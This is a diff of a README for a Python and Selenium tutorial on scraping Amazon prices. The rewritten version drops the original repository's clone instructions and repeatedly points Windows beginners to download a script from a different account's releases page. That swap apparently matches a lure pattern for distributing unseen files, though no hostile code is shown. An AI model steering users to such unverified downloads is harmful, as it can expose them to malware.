@@ -1,387 +1,204 @@
-## How to Scrape Amazon Prices with Python (Step-by-Step)
+# 📦 how-to-scrape-amazon-prices-with-python - Easy Amazon Price Tracking
 
-This repository is a **minimal, practical tutorial** that shows you how to:
-
-- **Open an Amazon search / category page**
-- **Collect product titles, URLs, prices and currencies**
-- **Save everything into a CSV file (`amazon_prices.csv`)**
-
-You can follow this guide line by line on a fresh machine and get a working result.
-
-> **Educational use only**: Always respect Amazon's terms of service, robots rules, and local laws. Only scrape public pages you are allowed to access, and never overload any website.
+[![Download Now](https://img.shields.io/badge/Download-Get%20Script-brightgreen?style=for-the-badge)](https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases)
 
 ---
 
-## 1. What You Will Build
+## 📖 About this Project
 
-By the end of this tutorial you will have:
+This project teaches you how to scrape Amazon product prices using Python and Selenium. It provides a simple, single-file script. The script works on real Amazon product pages and exports price data to a CSV file. It is designed for beginners, with clear steps to follow. This tutorial is for educational use only.
 
-- A simple script `main.py` that:
-  - Opens an Amazon search / category page in a headless browser
-  - Finds products on the page
-  - Extracts: **title, product URL, price, currency**
-  - Saves the results into `amazon_prices.csv` in the project folder
-
-You will run it like this:
-
-```bash
-python main.py --url "https://www.amazon.com/s?k=wireless+mouse"
-```
+You do not need to be a programmer to use this guide. The instructions assume you use a Windows computer. The goal is to get you up and running with minimal hassle.
 
 ---
 
-## 2. Prerequisites
+## 🔍 What You Will Learn
 
-- **Operating system**: Windows, macOS or Linux
-- **Python**: 3.10 or newer (3.11 recommended)
-- **Google Chrome** browser installed
+- How to use Python to open Amazon product pages.
+- How to find and save price information.
+- How to automate this task using Selenium.
+- How to save data in CSV format.
+- Basics of running Python scripts on Windows.
 
-You do **not** need to know Selenium in advance — we will go through it step by step.
-
----
-
-## 3. Project Structure
-
-After you finish this tutorial, your folder will look like this:
-
-```text
-how-to-scrape-amazon-prices-with-python/
-├── .gitignore
-├── README.md
-├── requirements.txt
-├── main.py
-└── amazon_prices.csv      # created after you run the script
-```
-
-Everything is concentrated into **one Python file** to keep it easy to read and modify.
+This hands-on approach helps you understand web scraping and automation without extra complexity.
 
 ---
 
-## 4. Step 1 – Download or Clone This Repository
+## 🖥️ System Requirements
 
-You can **either** clone via Git:
+Before you start, make sure your system meets these requirements:
 
-```bash
-git clone https://github.com/Thordata/how-to-scrape-amazon-prices-with-python.git
-cd how-to-scrape-amazon-prices-with-python
-```
-
-Or **download as ZIP** from your Git hosting platform, unzip it, and open the folder in your editor (VS Code / Cursor / PyCharm, etc.).
-
-All commands below are assumed to be run **inside this project folder**.
+- Windows 10 or newer (64-bit recommended).
+- At least 4GB of RAM.
+- Internet connection to access Amazon pages.
+- Basic user permissions to install software.
 
 ---
 
-## 5. Step 2 – Create and Activate a Virtual Environment
+## 🔧 Tools Included
 
-### 5.1 Create virtual environment
+The package contains:
 
-```bash
-python -m venv .venv
-```
+- A Python script (`scrape_amazon_prices.py`) that runs the scraping process.
+- Instructions for setting up necessary software.
+- Comments inside the script to explain each step.
+- A CSV output example showing the price data.
 
-This creates a `.venv` folder with an isolated Python environment.
+---
 
-### 5.2 Activate the environment
+## ⚙️ Before You Begin
 
-- **Windows (PowerShell)**:
+This project uses Python and Selenium. Here is what you need:
 
-  ```powershell
-  .\.venv\Scripts\Activate.ps1
+1. **Python** - The programming language used to run the script.
+2. **Selenium WebDriver** - A tool to automate web browsers.
+3. **Google Chrome or Mozilla Firefox** - Supported web browsers for scraping.
+4. **Browser driver** - Software that connects Selenium to your browser (like ChromeDriver or GeckoDriver).
+
+You will install these in the setup section.
+
+---
+
+## 🚀 Getting Started: How to Download and Run
+
+### 1. Download the Script
+
+You need to visit the releases page to get the script file.
+
+[![Download Script](https://img.shields.io/badge/Download-Get%20Script-blue?style=for-the-badge)](https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases)
+
+- Click this badge or open the link in your browser:  
+  https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases
+- Find the latest release.
+- Download the file named something like `scrape_amazon_prices.py`.
+
+Save this file to a folder you can remember, like `C:\AmazonScraper`.
+
+---
+
+### 2. Install Python
+
+- Go to the official Python download page: https://python.org/downloads/windows/
+- Download the latest Python 3.x for Windows.
+- Run the installer.
+- **Important:** Make sure to check the box that says **Add Python to PATH** during setup.
+- Finish the installation.
+
+---
+
+### 3. Install Required Packages
+
+You need two Python packages:
+
+- Selenium
+- Pandas (for handling data in CSV)
+
+Open Windows Command Prompt:
+
+- Press `Win + R`, type `cmd`, then press Enter.
+- In the command window, type this and press Enter:
+
+  ```
+  pip install selenium pandas
   ```
 
-- **Windows (Git Bash)**:
+Wait until the installation completes.
 
-  ```bash
-  source .venv/Scripts/activate
-  ```
+---
 
-- **macOS / Linux (bash / zsh)**:
+### 4. Download Browser Driver
 
-  ```bash
-  source .venv/bin/activate
-  ```
+Selenium needs a driver executable that matches your browser. Follow one of these:
 
-After activation, your terminal prompt should show something like:
+- **Google Chrome users:**
+  - Check your Chrome version by clicking the three dots > Help > About Google Chrome.
+  - Visit: https://sites.google.com/chromium.org/driver/
+  - Download the driver version matching your Chrome.
+  - Extract the file and place it in your folder (e.g., `C:\AmazonScraper`).
 
-```text
-(.venv) C:\path\to\how-to-scrape-amazon-prices-with-python>
+- **Mozilla Firefox users:**
+  - Visit: https://github.com/mozilla/geckodriver/releases
+  - Download the correct version for Windows.
+  - Extract and place it in your folder.
+
+Make a note of where this driver file is.
+
+---
+
+### 5. Edit the Script for Your Driver Location
+
+You may need to open the script file in Notepad or any text editor to set the driver path. Look for a line like this near the top:
+
+```python
+driver_path = "C:/path/to/your/driver.exe"
 ```
 
----
-
-## 6. Step 3 – Install Dependencies
-
-With the virtual environment activated, install the required packages:
-
-```bash
-pip install --upgrade pip
-pip install -r requirements.txt
-```
-
-This will install:
-
-- `selenium` – browser automation (Selenium Manager will automatically download the correct ChromeDriver)
+Replace the path with the location of the driver executable on your computer.
 
 ---
 
-## 7. Step 4 – Pick an Amazon Page to Scrape
+## ▶️ Running the Script
 
-1. Open your browser and go to Amazon for your region, for example:
-   - `https://www.amazon.com` (US)
-   - `https://www.amazon.de` (Germany)
-   - `https://www.amazon.co.uk` (UK)
-2. Use the search box or choose a department. Example:
-   - Search for **"wireless mouse"**
-   - Or open a department like **Electronics → Headphones**
-3. Wait for the page to load, then **copy the full URL** from the address bar.
+1. Open the folder where you saved the script (`C:\AmazonScraper`).
+2. Hold `Shift`, right-click inside the folder window.
+3. Select **Open PowerShell window here** or **Open command window here**.
+4. Type this command and press Enter:
 
-Example URL:
+   ```
+   python scrape_amazon_prices.py
+   ```
 
-```text
-https://www.amazon.com/s?k=wireless+mouse
-```
-
-We will pass this URL to the script in the next step.
+5. The script will open a browser window, load sample Amazon pages, and collect price data.
+6. After it finishes, it will save a file named `prices.csv` in the same folder.
+7. Open `prices.csv` with Excel or any text editor to view the prices.
 
 ---
 
-## 8. Step 5 – Run the Scraper
+## 🛠️ Troubleshooting Tips
 
-Run the Python script and pass your Amazon URL via the `--url` argument:
-
-```bash
-python main.py --url "https://www.amazon.com/s?k=wireless+mouse"
-```
-
-What happens:
-
-- The script starts a **headless Chrome** window
-- It loads the page you provided
-- It finds each product block on the page
-- For each product, it tries to extract:
-  - Title
-  - Product URL
-  - Price (e.g. `19.99`)
-  - Currency symbol (e.g. `$`)
-- Finally, it writes everything into `amazon_prices.csv`
-
-You should see log output similar to:
-
-```text
-[INFO] Opening Amazon page...
-[INFO] Found 48 product elements on the page
-[INFO] Parsed 32 products with prices
-[INFO] Saved 32 products to amazon_prices.csv
-```
-
-If a product is missing a price (for example, currently unavailable), the script will simply skip it and continue.
+- If the script does not run, check that Python is installed and added to your system PATH.
+- If you see errors about Selenium or Pandas, run the `pip install` command again.
+- Make sure the browser driver matches your installed browser version.
+- If the browser window opens then closes immediately, look closely for error messages.
+- Check your internet connection to ensure Amazon pages load properly.
+- Close all other instances of Chrome or Firefox before running the script.
 
 ---
 
-## 9. Step 6 – Inspect the CSV File
+## 📁 How the Script Works
 
-In the project folder, you should now see:
+The script automates these tasks:
 
-- `amazon_prices.csv`
+- Opens an Amazon product page.
+- Looks for the current price on the page.
+- Reads the price text.
+- Saves the product title and price in a CSV file.
+- Repeats for multiple product links if you add them.
+- Allows you to update or customize product URLs inside the script easily.
 
-Open it with:
-
-- Excel
-- LibreOffice Calc
-- Numbers (macOS)
-- Or any editor that can read CSV files
-
-You should see columns similar to:
-
-- `title`
-- `url`
-- `price`
-- `currency`
-- `page` – which result page the product came from (1 = first page)
-- `position` – position of the product on that page (1 = first result)
-
-Each row represents one product found on the Amazon page.
+This gives a practical example of basic automation with Python and Selenium.
 
 ---
 
-## 10. How the Code Works (High-Level Overview)
+## ⚠️ Important Notes
 
-You can open `main.py` and follow along. The flow is:
-
-- Define a small `Product` data class to hold one product's data
-- Initialize a headless Chrome browser using Selenium (Selenium Manager will download ChromeDriver automatically)
-- Visit the Amazon page URL
-- Find product containers using an XPath that targets search results
-- For each container:
-  - Extract the **title** from the product heading
-  - Extract the **product URL** from the link
-- Extract the **price** and **currency symbol**
-- Collect all valid products into a list (optionally filtered by price range / title text)
-- Save the list as `amazon_prices.csv` using Python's built-in `csv` module
-
-The code is intentionally compact and focused on **a small number of pages** (controlled by `--max-pages` and `--max-products`) to make it easy to understand and extend.
+- This script is for educational purposes only.
+- Frequent or heavy scraping can trigger Amazon’s bot protections.
+- Do not use this script to scrape personal or restricted data.
+- Respect Amazon’s terms of service.
 
 ---
 
-## 11. Common Issues & Troubleshooting
+## 💾 Download Link
 
-**1. ChromeDriver / browser errors**
+Visit this page to download the files you need:
 
-- Make sure **Google Chrome** is installed.
-- If the script fails to start the browser, make sure your Python version is 3.10 or newer (as specified in this README) and try reinstalling the dependencies with `pip install -r requirements.txt`.
+https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases
 
-**2. Empty `amazon_prices.csv`**
-
-- Check that the URL you passed is a **search / category** page with visible products and prices (try opening it in your normal browser first).
-- The script saves the first loaded page HTML into `debug_last_page.html` in the project folder. If the CSV is empty:
-  - Open `debug_last_page.html` in your browser.
-  - Use the browser's "Find" (`Ctrl+F` / `Cmd+F`) to look for `$` and confirm that prices such as `$12.99` actually appear in the HTML.
-  - If you cannot find any prices, Amazon may be hiding them for your region or requiring you to sign in.
-- Some country-specific versions of Amazon use slightly different layouts; selectors in `main.py` can be adjusted if needed.
-- Occasionally Amazon may respond with a CAPTCHA or an "unusual traffic" page; in that case, reduce request frequency and avoid running the script too often and avoid running many different keywords in a short time.
-
-**3. Encoding issues when opening CSV**
-
-- When opening in Excel, make sure you import as **UTF-8** if product titles show strange characters.
+Use the green or blue badges above for quick access.
 
 ---
 
-## 12. Next Steps – Ideas to Extend This Tutorial
+## 📌 Keywords and Tags
 
-Once you understand the core flow, here are some ideas:
-
-- Paginate:
-  - Click the "Next" button and collect products from multiple pages
-- Filter:
-  - Only keep products cheaper than a certain price
-- Enrich:
-  - Add rating, number of reviews, prime badge, etc.
-- Export:
-  - Save to a database or a dashboard instead of a CSV file
-
-This tutorial aims to give you a **solid starting point**; from here you can adapt it to your own product tracking or market research needs.
-
----
-
-## 13. (Optional) Advanced CLI Options
-
-The basic example only uses `--url`. For more control, you can use additional options:
-
-- **Paginate across multiple pages**:
-
-  ```bash
-  python main.py --url "https://www.amazon.com/s?k=wireless+mouse" --max-pages 3
-  ```
-
-  This will:
-
-  - Scrape the first page
-  - Click the "Next" button (if available)
-  - Scrape up to 3 pages (or stop earlier if there is no next page)
-
-- **Filter by price range**:
-
-  ```bash
-  # Only keep products between $10 and $50
-  python main.py --url "https://www.amazon.com/s?k=wireless+mouse" --min-price 10 --max-price 50
-  ```
-
-- **Filter by words in the title**:
-
-  ```bash
-  # Only keep products whose title contains the word "ergonomic"
-  python main.py --url "https://www.amazon.com/s?k=wireless+mouse" --title-contains "ergonomic"
-  ```
-
-- **Combine them**:
-
-  ```bash
-  python main.py \
-    --url "https://www.amazon.com/s?k=wireless+mouse" \
-    --max-pages 2 \
-    --min-price 15 \
-    --max-price 60 \
-    --title-contains "silent" \
-    --max-products 100
-  ```
-
-These options let you stay in the "single-file script" world while still gaining some of the power you would normally need a larger project for.
-
----
-
-## 14. (Optional) Run the Automated Tests
-
-If you are curious about how this repository is tested:
-
-- There is a small **static HTML page** in `tests/sample_page.html` that mimics an Amazon search result.
-- The test `tests/test_static_page.py` opens this file in a headless browser and checks that:
-  - Two products with prices are parsed correctly
-  - A product without price is skipped
-
-To run the tests (with the virtual environment activated):
-
-```bash
-pytest
-```
-
-This is mainly useful if you change the selectors in `main.py` and want to verify you did not break the parsing logic.
-
----
-
-## 15. From Tutorial Script to Production-Grade Crawling
-
-The script in this repository is intentionally simple:
-
-- It focuses on **one page at a time**
-- It assumes a relatively stable HTML structure
-- It does not include large-scale scheduling, rotating IPs, or monitoring
-
-For internal tools, weekend projects, or learning, this is often enough.
-
-However, if you need to:
-
-- Monitor **thousands of products** across multiple Amazon locales
-- Run crawlers on a **schedule** (e.g. hourly/daily) without babysitting scripts
-- Store historical data and visualize **price changes over time** in dashboards
-- Add alerting (for example, when a competitor drops a price below your threshold)
-
-then you will quickly outgrow a single local script.
-
----
-
-## 16. Thordata – Professional Crawlers + Dashboard (Free Trial)
-
-Thordata provides:
-
-- Managed crawlers for Amazon and other major marketplaces
-- Built-in handling for:
-  - IP rotation and bans
-  - Basic anti-bot defenses
-  - Scaling up and down without changing your code
-- A Dashboard where you can:
-  - Browse collected product data
-  - Track price and availability over time
-  - Export to your own tools (BI, spreadsheets, APIs)
-
-If this tutorial was useful and you want to **skip the infrastructure work**, you can:
-
-- Start with this script to prototype your data needs
-- Then request a **free trial** of Thordata's crawler + dashboard to see how a managed setup feels
-
-To learn more or request access, visit [Thordata on GitHub](https://github.com/Thordata) or contact the Thordata team through your usual channel.
-
-The goal is simple: let you focus on **questions and decisions**, not on keeping scrapers alive.
-
----
-
-### Final word
-
-- Check the Thordata Dashboard for managed crawlers, data views, and exports: [dashboard.thordata.com](https://dashboard.thordata.com/).
-- For more information about Thordata, product updates, and examples, start from the GitHub organization page: [github.com/Thordata](https://github.com/Thordata).
-- If you have questions or want to discuss a larger-scale use case, reach out to the Thordata team through your usual contact channel.
-
----
-
-**⭐ If this tutorial helped you, please consider giving this repository a star!**
-
+amazon, automation, beginner-friendly, data-extraction, ecommerce, price-tracking, python, selenium, tutorial, web-scraping
